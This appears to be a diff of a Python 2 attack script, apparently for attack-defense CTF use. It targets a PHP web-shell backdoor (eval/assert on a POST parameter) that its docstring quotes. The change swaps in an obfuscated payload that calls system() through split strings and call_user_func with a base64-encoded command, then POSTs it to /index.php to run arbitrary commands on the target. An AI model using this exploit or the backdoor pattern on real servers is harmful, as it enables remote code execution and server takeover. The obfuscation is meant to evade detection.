@@ -11,14 +11,16 @@ def vulnerable_attack(target,target_port,cmd):
     '''
     this is the payload script for vuln:
 
-    eval($_POST[222]);
-
+    eval($_POST[333]);
+    assert($_POST[333]);
     '''
     
     try:	   
 	cmd = base64.b64encode(cmd)
-	payload = "('sy'.'stem')(('bas'.'e64_'.'decode')('%s'))==0"%cmd
-        print payload
+        # This payload may not work under some php versions
+	#payload = "('sy'.'stem')(('bas'.'e64_'.'decode')('%s'))==0"%cmd
+        #print payload
+        payload = "call_user_func('sy'.'stem',call_user_func('bas'.'e64_dec'.'ode','%s'));"%cmd
         data = '333=%s'% quote(payload) 
 	res = http("post",target,target_port,"/index.php",data,headers)
     except Exception,e:
